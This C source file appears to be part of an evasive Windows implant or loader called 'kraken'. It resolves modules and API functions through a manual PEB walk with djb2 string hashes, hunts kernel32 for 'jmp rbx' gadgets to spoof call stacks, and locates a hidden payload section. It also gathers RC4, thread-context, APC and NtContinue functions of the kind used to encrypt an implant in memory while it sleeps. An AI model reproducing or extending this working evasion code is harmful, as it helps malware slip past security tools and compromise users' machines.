#include "kraken.h"

DWORD HashStringDjb2W(LPCWSTR String)
{
	ULONG Hash = 5381;
	INT c = 0;

	while (c = *String++)
		Hash = ((Hash << 5) + Hash) + c;

	return Hash;
}

DWORD HashStringDjb2A(LPCSTR String)
{
	ULONG Hash = 5381;
	INT c = 0;

	while (c = *String++)
		Hash = ((Hash << 5) + Hash) + c;

	return Hash;
}

PVOID GetK32Addr() {
	PTEB pCurrentTeb = (PTEB)__readgsqword(0x30);
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	return ((PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->Ldr->InMemoryOrderModuleList.Flink->Flink->Flink - 0x10))->DllBase;
}


PVOID FindGadget(PVOID pModule, fnCheckGadget CallbackCheck)
{
	for (int i = 0;; i++)
	{
		if (CallbackCheck((UINT_PTR)pModule + i))
			return (UINT_PTR)pModule + i;
	}
}

BOOL fnGadgetJmpRbx(PVOID pAddr)
{
	if (
		((PBYTE)pAddr)[0] == 0xFF &&
		((PBYTE)pAddr)[1] == 0x23
		)
		return TRUE;
	else
		return FALSE;
}

BOOL fnGadgetJmpRax(PVOID pAddr)
{

	if (
		((PBYTE)pAddr)[0] == 0xFF &&
		((PBYTE)pAddr)[1] == 0xe0
		)
		return TRUE;
	else
		return FALSE;
}


PVOID Spoofer(PVOID pFunction, PVOID pArg1, PVOID pArg2, PVOID pArg3, PVOID pArg4, PVOID pArg5, PVOID pArg6, PVOID pArg7, PVOID pArg8)
{
	PVOID pGadgetAddr = NULL;
	PVOID pK32 = GetK32Addr();
	pGadgetAddr = FindGadget(pK32, fnGadgetJmpRbx);
	PRM param = { pGadgetAddr, pFunction };

	PVOID pRet = SpoofStub(pArg1, pArg2, pArg3, pArg4, &param, NULL, pArg5, pArg6, pArg7, pArg8);
	return pRet;
}

BOOL TakeSectionInfo(PSECTION_INFO SecInfo) 
{

	PTEB pCurrentTeb = (PTEB)__readgsqword(0x30);
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;

	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pCurrentPeb->ImageBaseAddress;
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pCurrentPeb->ImageBaseAddress + pImageDosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pImageNtHeaders);

	for (WORD i = 0; i < pImageNtHeaders->FileHeader.NumberOfSections; i++) {
		if (HashStringDjb2A(pSectionHeader[i].Name) == 0xb80c0d8)
		{
			SecInfo->pAddr = (((DWORD_PTR)pCurrentPeb->ImageBaseAddress) + pSectionHeader[i].VirtualAddress);
			(DWORD_PTR)SecInfo->pAddr += SECTION_HEADER_SIZE;
			SecInfo->dwSize = (pSectionHeader[i].SizeOfRawData - SECTION_HEADER_SIZE);

			return TRUE;
		}

	}
	return FALSE;
}

PVOID fnGetModuleAddr(DWORD dwHash)
{
	PTEB pCurrentTeb = (PTEB)__readgsqword(0x30);
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	PVOID pLdrDataEntryFirstEntry = (PVOID)((PBYTE)pCurrentPeb->Ldr->InMemoryOrderModuleList.Flink->Flink);

	LIST_ENTRY* pListParser = (DWORD64)pLdrDataEntryFirstEntry - 0x10;
	while (pListParser->Flink != pLdrDataEntryFirstEntry)
	{
		PLDR_DATA_TABLE_ENTRY pLdrDataEntry = pListParser;
		if (HashStringDjb2W(pLdrDataEntry->BaseDllName.Buffer) == dwHash)
		{
			return pLdrDataEntry->DllBase;
		}
		pListParser = pListParser->Flink;
	}

	return NULL;
}

PVOID fnGetProcAddr(PVOID pModuleAddr, INT32 FunctionHash)
{
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleAddr;
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleAddr + pImageDosHeader->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleAddr + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);

	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleAddr + pImgExportDir->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleAddr + pImgExportDir->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleAddr + pImgExportDir->AddressOfNameOrdinals);

	for (WORD i = 0; i < pImgExportDir->NumberOfNames; i++)
	{
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleAddr + pdwAddressOfNames[i]);
		if (HashStringDjb2A(pczFunctionName) == FunctionHash)
		{
			return (PBYTE)pModuleAddr + pdwAddressOfFunctions[pwAddressOfNameOrdinales[i]];
		}
	}

	return NULL;
}

VOID InitInstance(PINSTANCE Inst)
{
	Inst->wModule.pNtdll =					fnGetModuleAddr(HASH_Ntdll);
	Inst->wModule.pKernel32 =				fnGetModuleAddr(HASH_Kernel32);

	Inst->wFunction.pCreateEventW =			fnGetProcAddr(Inst->wModule.pKernel32, HASH_CreateEventW);
	Inst->wFunction.pCreateThread =			fnGetProcAddr(Inst->wModule.pKernel32, HASH_CreateThread);
	Inst->wFunction.pGetThreadContext =		fnGetProcAddr(Inst->wModule.pKernel32, HASH_GetThreadContext);
	Inst->wFunction.pVirtualProtect =		fnGetProcAddr(Inst->wModule.pKernel32, HASH_VirtualProtect);
	Inst->wFunction.pWaitForSingleObject =	fnGetProcAddr(Inst->wModule.pKernel32, HASH_WaitForSingleObject);
	Inst->wFunction.pSetEvent =				fnGetProcAddr(Inst->wModule.pKernel32, HASH_SetEvent);

	Inst->wFunction.pQueueUserAPC =			fnGetProcAddr(Inst->wModule.pKernel32, HASH_QueueUserAPC);
	Inst->wFunction.pTerminateThread =		fnGetProcAddr(Inst->wModule.pKernel32, HASH_TerminateThread);
	Inst->wFunction.pCloseHandle =			fnGetProcAddr(Inst->wModule.pKernel32, HASH_CloseHandle);
	Inst->wFunction.pLoadLibraryA =			fnGetProcAddr(Inst->wModule.pKernel32, HASH_LoadLibraryA);

	Inst->wFunction.pTpReleaseCleanupGroupMembers =		fnGetProcAddr(Inst->wModule.pNtdll, HASH_TpReleaseCleanupGroupMembers);
	Inst->wFunction.pNtContinue =						fnGetProcAddr(Inst->wModule.pNtdll, HASH_NtContinue);
	Inst->wFunction.pNtTestAlert =						fnGetProcAddr(Inst->wModule.pNtdll, HASH_NtTestAlert);
	Inst->wFunction.pNtAlertResumeThread =				fnGetProcAddr(Inst->wModule.pNtdll, HASH_NtAlertResumeThread);
	Inst->wFunction.pRtlExitUserThread =				fnGetProcAddr(Inst->wModule.pNtdll, HASH_RtlExitUserThread);

	Inst->wModule.pCryptsp =							((fnLoadLibraryA)Inst->wFunction.pLoadLibraryA)("Cryptsp");
	Inst->wFunction.pSystemFunction032 =				fnGetProcAddr(Inst->wModule.pCryptsp, HASH_SystemFunction032);

	Inst->wModule.pBcrypt =								((fnLoadLibraryA)Inst->wFunction.pLoadLibraryA)("Bcrypt");
	Inst->wFunction.pBCryptOpenAlgorithmProvider =		fnGetProcAddr(Inst->wModule.pBcrypt, HASH_BCryptOpenAlgorithmProvider);
	Inst->wFunction.pBCryptGenRandom =					fnGetProcAddr(Inst->wModule.pBcrypt, HASH_BCryptGenRandom);
	Inst->wFunction.pBCryptCloseAlgorithmProvider =		fnGetProcAddr(Inst->wModule.pBcrypt, HASH_BCryptCloseAlgorithmProvider);
}

VOID MyMemncpy(PBYTE dst, PBYTE src, DWORD dwSize)
{
	for (DWORD i = 0; i < dwSize; i++)
	{
		dst[i] = src[i];
	}
}
